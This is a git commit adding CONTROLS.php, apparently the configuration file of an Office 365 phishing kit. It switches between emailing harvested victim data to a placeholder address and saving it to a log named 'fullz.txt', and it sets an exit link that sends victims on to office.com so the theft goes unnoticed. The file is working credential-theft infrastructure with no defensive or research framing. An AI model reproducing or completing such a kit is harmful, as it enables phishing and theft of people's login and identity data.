bc03f1cfd1bbcd87491cb6a1b11ee7a48547a608
tyrone121mo <62272769+tyrone121mo@users.noreply.github.com>
2020-03-17 03:02:32 +0000

    Add files via upload

---
+++ CONTROLS.php
@@ -0,0 +1,16 @@
+<?php
+// Systems:
+
+// - Send results via email (Change '0' from $sendEmail to '1' to activate)
+// - Save results on server (Change '0' from $saveFile to '1' to activate) => assets/logs/fullz.txt
+
+
+$saveFile = 0;
+$sendEmail = 1;
+
+
+
+$to = 'GUCCIBASE_EMAIL';
+$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwi795Gu8pHkAhWR1aYKHQWDArMQFjAAegQIAhAB&url=https%3A%2F%2Fwww.office.com%2F&usg=AOvVaw297op3g8pyu3qja2RPtXVz";
+
+?>
